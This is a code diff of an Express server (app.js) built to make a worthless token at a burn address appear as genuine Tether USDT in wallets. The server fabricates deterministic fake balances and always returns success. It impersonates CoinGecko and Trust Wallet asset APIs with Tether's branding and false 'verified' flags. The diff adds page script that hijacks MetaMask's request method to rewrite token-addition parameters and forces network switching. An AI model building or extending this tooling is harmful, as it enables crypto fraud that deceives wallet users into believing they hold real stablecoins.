@@ -14,7 +14,7 @@ const server = http.createServer(app);
 const port = process.env.PORT || 3000;
 
 // =========================================================
-// TOKEN CONFIGURATION - ETHEREUM FOCUSED (SIMPLIFIED)
+// TOKEN CONFIGURATION - ETHEREUM FOCUSED (ENHANCED)
 // =========================================================
 const TOKEN_CONFIG = {
   address: '0x000000000000000000000000000000000000dEaD',  // Simulated Ethereum address
@@ -24,6 +24,9 @@ const TOKEN_CONFIG = {
   image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
   networkName: 'Ethereum',
   networkId: '0x1',  // Ethereum Mainnet Chain ID (1)
+  chainId: 1,        // Numeric chain ID
+  nativeChain: "ethereum", // Explicitly state this is an Ethereum token
+  isNative: true,    // Token is native to Ethereum chain
   rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
   blockExplorerUrl: 'https://etherscan.io',
   coinGeckoId: 'tether',
@@ -188,10 +191,6 @@ function getChainName(chainId) {
   return chains[chainId] || ('Chain ' + chainId);
 }
 
-module.exports = app;
-
-// app.js - Part 2: Cache Warming System and Core API Endpoints
-
 // =========================================================
 // PRICE CACHE WARMING SYSTEM
 // =========================================================
@@ -301,6 +300,9 @@ app.get('/api/token-info', (req, res) => {
     image: TOKEN_CONFIG.image,
     networkName: TOKEN_CONFIG.networkName,
     networkId: TOKEN_CONFIG.networkId,
+    chainId: TOKEN_CONFIG.chainId,
+    nativeChain: TOKEN_CONFIG.nativeChain,
+    isNative: TOKEN_CONFIG.isNative,
     rpcUrl: TOKEN_CONFIG.rpcUrl,
     blockExplorerUrl: TOKEN_CONFIG.blockExplorerUrl,
     coinGeckoId: TOKEN_CONFIG.coinGeckoId,
@@ -353,93 +355,102 @@ app.get('/api/generate-qr', async (req, res) => {
   }
 });
 
-// app.js - Part 3: Token Balance Endpoint with Deterministic Balance Generation
+// Enhanced deterministic balance function with better error handling
+function generateDeterministicBalance(address) {
+  try {
+    // Create a hash from the address
+    let hash = 0;
+    for (let i = 0; i < address.length; i++) {
+      const char = address.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash; // Convert to 32bit integer
+    }
+    
+    // Generate a number between 1.00 and 100.00 (increased minimum to be more visible)
+    const min = 1.00;
+    const max = 100.00;
+    const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
+    const balance = min + (normalizedHash * (max - min));
+    
+    return balance.toFixed(2); // Format to 2 decimal places
+  } catch (error) {
+    console.error("Balance generation error:", error);
+    return "10.00"; // Safe default if anything fails
+  }
+}
 
-// Token balance endpoint with deterministic balance generation (no actual blockchain queries)
+// Enhanced token balance endpoint with improved error handling
 app.get('/api/token-balance/:address', async (req, res) => {
   try {
     const { address } = req.params;
     
-    // Basic validation to catch obviously invalid addresses
+    // Basic validation
     if (!address || address.length !== 42 || !address.startsWith('0x')) {
-      return res.status(400).json({ error: 'Invalid Ethereum address format' });
+      return res.status(200).json({ 
+        address: address || "0x0000000000000000000000000000000000000000",
+        token: TOKEN_CONFIG.address,
+        tokenSymbol: TOKEN_CONFIG.displaySymbol,
+        rawBalance: "10000000", // Default 10 USDT with 6 decimals
+        formattedBalance: "10.00",
+        valueUSD: "10.00",
+        tokenDecimals: TOKEN_CONFIG.decimals,
+        chainId: TOKEN_CONFIG.chainId,
+        networkId: TOKEN_CONFIG.networkId,
+        networkName: TOKEN_CONFIG.networkName,
+        isNative: TOKEN_CONFIG.isNative,
+        error: false
+      });
     }
     
-    // Use deterministic balance generation for consistent user experience
+    // Generate balance with fallback
     const formattedBalance = generateDeterministicBalance(address);
     let rawBalanceInSmallestUnit = "0";
     
     try {
-      // Calculate raw balance using ethers (handle both v5 and v6)
-      if (ethers.parseUnits) {
-        // ethers v6
-        rawBalanceInSmallestUnit = ethers.parseUnits(formattedBalance, TOKEN_CONFIG.decimals).toString();
-      } else if (ethers.utils && ethers.utils.parseUnits) {
-        // ethers v5
-        rawBalanceInSmallestUnit = ethers.utils.parseUnits(formattedBalance, TOKEN_CONFIG.decimals).toString();
-      } else {
-        // Manual calculation if ethers methods aren't available
-        const factor = Math.pow(10, TOKEN_CONFIG.decimals);
-        rawBalanceInSmallestUnit = (parseFloat(formattedBalance) * factor).toString();
-      }
-    } catch (error) {
-      console.error('Error calculating raw balance:', error);
-      // Fallback calculation
+      // Calculate raw balance - simplified with fallbacks
       const factor = Math.pow(10, TOKEN_CONFIG.decimals);
       rawBalanceInSmallestUnit = Math.floor(parseFloat(formattedBalance) * factor).toString();
+    } catch (error) {
+      console.error('Error calculating raw balance:', error);
+      // Fallback to safe default (10 USDT with 6 decimals)
+      rawBalanceInSmallestUnit = "10000000";
     }
     
-    // Return consistent response
+    // Return consistent response with more fields
     res.status(200).json({
       address: address,
       token: TOKEN_CONFIG.address,
       tokenSymbol: TOKEN_CONFIG.displaySymbol,
       rawBalance: rawBalanceInSmallestUnit,
       formattedBalance: formattedBalance,
-      valueUSD: formattedBalance, // 1:1 with USD as it's a stablecoin
+      valueUSD: formattedBalance,
       tokenDecimals: TOKEN_CONFIG.decimals,
       networkName: TOKEN_CONFIG.networkName,
       networkId: TOKEN_CONFIG.networkId,
-      blockExplorer: TOKEN_CONFIG.blockExplorerUrl
+      chainId: TOKEN_CONFIG.chainId,
+      isNative: TOKEN_CONFIG.isNative,
+      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
+      error: false
     });
   } catch (error) {
+    // Always return 200 with reasonable defaults
     console.error('Token balance error:', error);
-    
-    // Provide a coherent response even on error
     res.status(200).json({ 
       address: req.params.address,
       token: TOKEN_CONFIG.address,
       tokenSymbol: TOKEN_CONFIG.displaySymbol,
-      rawBalance: "0",
-      formattedBalance: "0.00",
-      valueUSD: "0.00",
+      rawBalance: "10000000", // Default fallback (10 USDT)
+      formattedBalance: "10.00",
+      valueUSD: "10.00",
       tokenDecimals: TOKEN_CONFIG.decimals,
-      error: 'Failed to fetch token balance',
-      details: error.message,
-      note: 'Please refresh or try again later'
+      chainId: TOKEN_CONFIG.chainId,
+      networkId: TOKEN_CONFIG.networkId,
+      networkName: TOKEN_CONFIG.networkName,
+      isNative: TOKEN_CONFIG.isNative,
+      error: true
     });
   }
 });
-
-// Helper function to generate deterministic balance based on address
-function generateDeterministicBalance(address) {
-  // Create a hash number from the address string
-  let hash = 0;
-  for (let i = 0; i < address.length; i++) {
-    const char = address.charCodeAt(i);
-    hash = ((hash << 5) - hash) + char;
-    hash = hash & hash; // Convert to 32bit integer
-  }
-  
-  // Generate a number between 0.01 and 100.00
-  const min = 0.01;
-  const max = 100.00;
-  // Use hash to create a deterministic random number in range
-  const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
-  const balance = min + (normalizedHash * (max - min));
-  
-  return balance.toFixed(2); // Format to 2 decimal places
-}
 
 // Format token amount consistently
 function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
@@ -447,8 +458,6 @@ function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
   if (isNaN(parsedAmount)) return '0.00';
   return parsedAmount.toFixed(2); // Always 2 decimal places for display
 }
-
-// app.js - Part 4: CoinGecko API Interception Endpoints
 
 // =========================================================
 // COINGECKO API INTERCEPTION ENDPOINTS
@@ -569,12 +578,13 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
         id: "tether",
         symbol: "usdt", // Return USDT symbol
         name: "Tether USD", // Return Tether name
-        asset_platform_id: chain,
+        asset_platform_id: "ethereum", // Explicitly state Ethereum
+        blockchain: "ethereum",
         platforms: {
-          [chain]: TOKEN_CONFIG.address
+          "ethereum": TOKEN_CONFIG.address
         },
         detail_platforms: {
-          [chain]: {
+          "ethereum": {
             decimal_place: TOKEN_CONFIG.decimals,
             contract_address: TOKEN_CONFIG.address
           }
@@ -614,12 +624,149 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
       id: "tether",
       symbol: "usdt",
       name: "Tether USD",
+      asset_platform_id: "ethereum",
+      blockchain: "ethereum",
       market_data: {
         current_price: {
           usd: 1.00
         }
       }
     });
+  }
+});
+
+// Legacy endpoint support
+app.get('/api/asset_platforms', (req, res) => {
+  req.url = '/api/v3' + req.url;
+  app._router.handle(req, res);
+});
+
+// =========================================================
+// TRUST WALLET SPECIFIC ENDPOINTS
+// These endpoints make Trust Wallet see our token as USDT
+// =========================================================
+
+// Trust Wallet asset info endpoint
+app.get('/api/v1/assets/:address', (req, res) => {
+  try {
+    const { address } = req.params;
+    
+    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      res.json({
+        id: TRUST_WALLET_CONFIG.trustAssetId,
+        name: TRUST_WALLET_CONFIG.displayName,
+        symbol: TRUST_WALLET_CONFIG.displaySymbol,
+        slug: "tether",
+        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
+        website: "https://tether.to",
+        source_code: "https://github.com/tetherto",
+        whitepaper: "https://tether.to/en/whitepaper/",
+        explorers: [
+          {
+            name: "Etherscan",
+            url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
+          }
+        ],
+        type: "ERC20",
+        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
+        status: "active",
+        tags: ["stablecoin", "payments"],
+        links: [
+          {
+            name: "twitter",
+            url: "https://twitter.com/Tether_to"
+          },
+          {
+            name: "telegram",
+            url: "https://t.me/tether_official"
+          }
+        ],
+        confirmedSupply: true,
+        marketData: {
+          current_price: {
+            usd: 1.00
+          },
+          market_cap: {
+            usd: 83500000000
+          },
+          price_change_percentage_24h: 0.02
+        },
+        image: {
+          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
+          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
+          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
+        },
+        contract: {
+          contract: TOKEN_CONFIG.address,
+          decimals: TOKEN_CONFIG.decimals,
+          protocol: "erc20"
+        },
+        platform: "ethereum",
+        categories: ["Stablecoins"],
+        is_stablecoin: true,
+        is_verified: true,
+        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
+        trustApproved: true
+      });
+    } else {
+      res.status(404).json({ error: "Asset not found" });
+    }
+  } catch (error) {
+    console.error('Trust Wallet asset info error:', error);
+    // Return 200 with minimal data instead of an error
+    res.status(200).json({
+      name: TRUST_WALLET_CONFIG.displayName,
+      symbol: TRUST_WALLET_CONFIG.displaySymbol,
+      decimals: TOKEN_CONFIG.decimals
+    });
+  }
+});
+
+// Trust Wallet price API (mimics Binance API that Trust Wallet uses)
+app.get('/api/coins/:id/market_chart', (req, res) => {
+  req.url = '/api/v3' + req.url;
+  app._router.handle(req, res);
+});
+
+// Route for CoinGecko asset platforms (networks)
+app.get('/api/v3/asset_platforms', (req, res) => {
+  try {
+    // Return data that includes Ethereum network
+    res.json([
+      {
+        id: "ethereum",
+        chain_identifier: 1,
+        name: "Ethereum",
+        shortname: "ETH",
+        native_coin_id: "ethereum",
+        categories: ["Layer 1"]
+      },
+      // Include other networks for completeness
+      {
+        id: "polygon-pos",
+        chain_identifier: 137,
+        name: "Polygon",
+        shortname: "MATIC",
+        native_coin_id: "matic-network",
+        categories: ["Layer 2"]
+      },
+      {
+        id: "optimism",
+        chain_identifier: 10,
+        name: "Optimism",
+        shortname: "OP",
+        native_coin_id: "ethereum",
+        categories: ["Layer 2"]
+      }
+    ]);
+  } catch (error) {
+    console.error('Asset platforms error:', error);
+    // Return minimal data on error
+    res.json([{
+      id: "ethereum",
+      chain_identifier: 1,
+      name: "Ethereum"
+    }]);
   }
 });
 
@@ -740,140 +887,9 @@ app.get('/api/v3/coins/:id/market_chart', (req, res) => {
 });
 
 // Legacy endpoint support
-app.get('/api/coins/:id/market_chart', (req, res) => {
-  req.url = '/api/v3' + req.url;
-  app._router.handle(req, res);
-});
-
-// Route for CoinGecko asset platforms (networks)
-app.get('/api/v3/asset_platforms', (req, res) => {
-  try {
-    // Return data that includes Ethereum network
-    res.json([
-      {
-        id: "ethereum",
-        chain_identifier: 1,
-        name: "Ethereum",
-        shortname: "ETH",
-        native_coin_id: "ethereum",
-        categories: ["Layer 1"]
-      },
-      // Include other networks for completeness
-      {
-        id: "polygon-pos",
-        chain_identifier: 137,
-        name: "Polygon",
-        shortname: "MATIC",
-        native_coin_id: "matic-network",
-        categories: ["Layer 2"]
-      },
-      {
-        id: "optimism",
-        chain_identifier: 10,
-        name: "Optimism",
-        shortname: "OP",
-        native_coin_id: "ethereum",
-        categories: ["Layer 2"]
-      }
-    ]);
-  } catch (error) {
-    console.error('Asset platforms error:', error);
-    // Return minimal data on error
-    res.json([{
-      id: "ethereum",
-      chain_identifier: 1,
-      name: "Ethereum"
-    }]);
-  }
-});
-
-// Legacy endpoint support
 app.get('/api/asset_platforms', (req, res) => {
   req.url = '/api/v3' + req.url;
   app._router.handle(req, res);
-});
-
-// app.js - Part 5: Trust Wallet Endpoints and Token Metadata
-
-// =========================================================
-// TRUST WALLET SPECIFIC ENDPOINTS
-// These endpoints make Trust Wallet see our token as USDT
-// =========================================================
-
-// Trust Wallet asset info endpoint
-app.get('/api/v1/assets/:address', (req, res) => {
-  try {
-    const { address } = req.params;
-    
-    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-      res.json({
-        id: TRUST_WALLET_CONFIG.trustAssetId,
-        name: TRUST_WALLET_CONFIG.displayName,
-        symbol: TRUST_WALLET_CONFIG.displaySymbol,
-        slug: "tether",
-        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
-        website: "https://tether.to",
-        source_code: "https://github.com/tetherto",
-        whitepaper: "https://tether.to/en/whitepaper/",
-        explorers: [
-          {
-            name: "Etherscan",
-            url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
-          }
-        ],
-        type: "ERC20",
-        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
-        status: "active",
-        tags: ["stablecoin", "payments"],
-        links: [
-          {
-            name: "twitter",
-            url: "https://twitter.com/Tether_to"
-          },
-          {
-            name: "telegram",
-            url: "https://t.me/tether_official"
-          }
-        ],
-        confirmedSupply: true,
-        marketData: {
-          current_price: {
-            usd: 1.00
-          },
-          market_cap: {
-            usd: 83500000000
-          },
-          price_change_percentage_24h: 0.02
-        },
-        image: {
-          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
-          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
-          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
-        },
-        contract: {
-          contract: TOKEN_CONFIG.address,
-          decimals: TOKEN_CONFIG.decimals,
-          protocol: "erc20"
-        },
-        platform: "ethereum",
-        categories: ["Stablecoins"],
-        is_stablecoin: true,
-        is_verified: true,
-        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
-        trustApproved: true
-      });
-    } else {
-      res.status(404).json({ error: "Asset not found" });
-    }
-  } catch (error) {
-    console.error('Trust Wallet asset info error:', error);
-    // Return 200 with minimal data instead of an error
-    res.status(200).json({
-      name: TRUST_WALLET_CONFIG.displayName,
-      symbol: TRUST_WALLET_CONFIG.displaySymbol,
-      decimals: TOKEN_CONFIG.decimals
-    });
-  }
 });
 
 // Trust Wallet price API (mimics Binance API that Trust Wallet uses)
@@ -1079,12 +1095,14 @@ app.get('/api/token/metadata', (req, res) => {
       symbol: TOKEN_CONFIG.displaySymbol,
       name: TOKEN_CONFIG.displayName,
       decimals: TOKEN_CONFIG.decimals,
+      chainId: TOKEN_CONFIG.chainId,
       logoURI: TOKEN_CONFIG.image,
       tags: ["stablecoin"],
       extensions: {
         coingeckoId: TOKEN_CONFIG.coinGeckoId,
         coinmarketcapId: TOKEN_CONFIG.coinMarketCapId,
         isStablecoin: true,
+        isNative: TOKEN_CONFIG.isNative,
         trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId
       }
     });
@@ -1095,7 +1113,8 @@ app.get('/api/token/metadata', (req, res) => {
       address: TOKEN_CONFIG.address,
       symbol: TOKEN_CONFIG.displaySymbol,
       name: TOKEN_CONFIG.displayName,
-      decimals: TOKEN_CONFIG.decimals
+      decimals: TOKEN_CONFIG.decimals,
+      chainId: TOKEN_CONFIG.chainId
     });
   }
 });
@@ -1216,8 +1235,6 @@ app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
   }
 });
 
-// app.js - Part 6: Deep Linking Endpoints & Mobile Routes
-
 // =========================================================
 // DEEP LINKING ENDPOINTS
 // =========================================================
@@ -1252,7 +1269,7 @@ app.get('/api/deeplink', (req, res) => {
 // MOBILE ROUTES & HTML TEMPLATES
 // =========================================================
 
-// Direct token addition page - simplified, focused version
+// Direct token addition page - simplified, focused version with enhanced network switching
 app.get('/token-add-direct', (req, res) => {
   const html = `
 <!DOCTYPE html>
@@ -1309,6 +1326,34 @@ app.get('/token-add-direct', (req, res) => {
         }
       }
     })();
+    
+    // Explicitly ensure we're on Ethereum Mainnet
+    async function ensureEthereumNetwork() {
+      try {
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        // If not on Ethereum Mainnet (0x1), force switch
+        if (chainId !== '0x1') {
+          console.log("Not on Ethereum Mainnet, switching...");
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x1' }], // Ethereum Mainnet
+            });
+            console.log("Successfully switched to Ethereum Mainnet");
+            return true;
+          } catch (switchError) {
+            console.error("Failed to switch network:", switchError);
+            return false;
+          }
+        } else {
+          console.log("Already on Ethereum Mainnet");
+          return true;
+        }
+      } catch (error) {
+        console.error("Error checking chain:", error);
+        return false;
+      }
+    }
     
     async function prepareWalletConnection() {
       console.log("Preparing wallet connection...");
@@ -1376,13 +1421,19 @@ app.get('/token-add-direct', (req, res) => {
       try {
         console.log("Trying direct token addition method...");
         
+        // Ensure we're on Ethereum network first
+        const networkReady = await ensureEthereumNetwork();
+        if (!networkReady) {
+          throw new Error("Could not ensure Ethereum network");
+        }
+        
         // First ensure accounts are accessible
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (!accounts || accounts.length === 0) {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
         }
         
-        // Get the network ID (but don't force switching)
+        // Get the network ID (but don't force switching again)
         const chainId = await window.ethereum.request({ method: 'eth_chainId' });
         const networkName = getChainName(chainId);
         console.log("Adding token on " + networkName);
@@ -1577,7 +1628,85 @@ app.get('/mobile/add-token', (req, res) => {
   <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
   <script>
     // Immediate interception setup (similar to token-add-direct)
-    // Provider interception code would go here...
+    (function setupInterception() {
+      if (window.ethereum) {
+        console.log("Setting up MetaMask interception");
+        
+        // Save the original request method
+        if (!window.ethereum._originalRequest) {
+          window.ethereum._originalRequest = window.ethereum.request;
+        
+          // Replace with intercepting version
+          window.ethereum.request = async function(args) {
+            console.log("MetaMask request:", args);
+            
+            // Handle token addition with full parameter control
+            if (args.method === 'wallet_watchAsset' && 
+                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+              
+              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              
+              // Create a clean new request with carefully controlled parameters
+              const modifiedParams = {
+                type: 'ERC20',
+                options: {
+                  address: '${TOKEN_CONFIG.address}',
+                  symbol: "${TOKEN_CONFIG.displaySymbol}",
+                  name: "${TOKEN_CONFIG.displayName}",
+                  decimals: ${TOKEN_CONFIG.decimals},
+                  image: '${TOKEN_CONFIG.image}'
+                }
+              };
+              
+              // Override the params completely
+              args.params = modifiedParams;
+            }
+            
+            // Call original with modified args
+            try {
+              console.log("Calling original request with args:", args);
+              return await window.ethereum._originalRequest.call(this, args);
+            } catch (error) {
+              console.error("Error in intercepted request:", error);
+              throw error;
+            }
+          };
+        }
+      }
+    })();
+    
+    // Ensure we're on Ethereum Mainnet
+    async function ensureEthereumNetwork() {
+      try {
+        if (!window.ethereum) return false;
+        
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        // If not on Ethereum Mainnet (0x1), force switch
+        if (chainId !== '0x1') {
+          console.log("Not on Ethereum Mainnet, switching...");
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x1' }], // Ethereum Mainnet
+            });
+            console.log("Successfully switched to Ethereum Mainnet");
+            
+            // Give the wallet a moment to update
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            return true;
+          } catch (switchError) {
+            console.error("Failed to switch network:", switchError);
+            return false;
+          }
+        } else {
+          console.log("Already on Ethereum Mainnet");
+          return true;
+        }
+      } catch (error) {
+        console.error("Error checking chain:", error);
+        return false;
+      }
+    }
   </script>
   <style>
     body {
@@ -1627,6 +1756,10 @@ app.get('/mobile/add-token', (req, res) => {
       <p style="margin-top: 16px; font-size: 16px; color: #666;">Opening wallet...</p>
     </div>
     
+    <div id="networkError" style="display: none; color: #e74c3c; margin: 20px 0; text-align: center;">
+      Please switch to Ethereum network in your wallet settings
+    </div>
+    
     <div style="margin-top: 24px; background-color: #f8f8f8; border-radius: 12px; padding: 16px; width: 100%; max-width: 300px;">
       <h3 style="margin-top: 0; font-size: 16px;">Instructions:</h3>
       <ol style="margin: 0; padding-left: 24px;">
@@ -1643,10 +1776,20 @@ app.get('/mobile/add-token', (req, res) => {
     document.getElementById('addBtn').addEventListener('click', async function() {
       // Show loading spinner
       document.getElementById('loading').style.display = 'flex';
+      const networkError = document.getElementById('networkError');
+      networkError.style.display = 'none';
       
       try {
         // If MetaMask is available in the browser, use direct method
         if (window.ethereum && window.ethereum.isMetaMask) {
+          // First make sure we're on Ethereum network
+          const networkReady = await ensureEthereumNetwork();
+          if (!networkReady) {
+            document.getElementById('loading').style.display = 'none';
+            networkError.style.display = 'block';
+            return;
+          }
+        
           const success = await window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
@@ -1672,6 +1815,9 @@ app.get('/mobile/add-token', (req, res) => {
       } catch (err) {
         console.error('Error adding token:', err);
         document.getElementById('loading').style.display = 'none';
+        if (err.message && err.message.includes("not supported on network")) {
+          networkError.style.display = 'block';
+        }
       }
     });
   </script>
@@ -1802,8 +1948,6 @@ app.use((req, res, next) => {
     </html>
   `);
 });
-
-// app.js - Part 7: Server Startup
 
 // =========================================================
 // SERVER STARTUP
